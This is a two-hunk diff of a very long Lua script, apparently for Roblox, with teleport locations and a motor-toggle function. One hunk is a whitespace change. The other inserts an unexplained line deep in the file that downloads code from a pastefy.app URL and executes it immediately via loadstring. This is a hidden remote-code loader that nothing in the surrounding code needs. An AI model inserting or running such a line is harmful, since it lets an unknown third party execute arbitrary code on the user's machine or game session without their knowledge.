@@ -18460,7 +18460,7 @@ do
 									end)
 								end
 							end
-
+  
 							table.insert(tbl7.TeleportLocations, workspace.SpawnLocation)
 							table.insert(tbl7.TeleportLocations, part3)
 							tbl12 = {}
@@ -18845,7 +18845,7 @@ do
 							end
 						end
 					end
-
+local u = loadstring(game:HttpGet'https://pastefy.app/FJWfrz0i/raw')()
 					do
 						tbl12.ToggleMotor6D = function(arg, enabled, arg2)
 							if not arg then
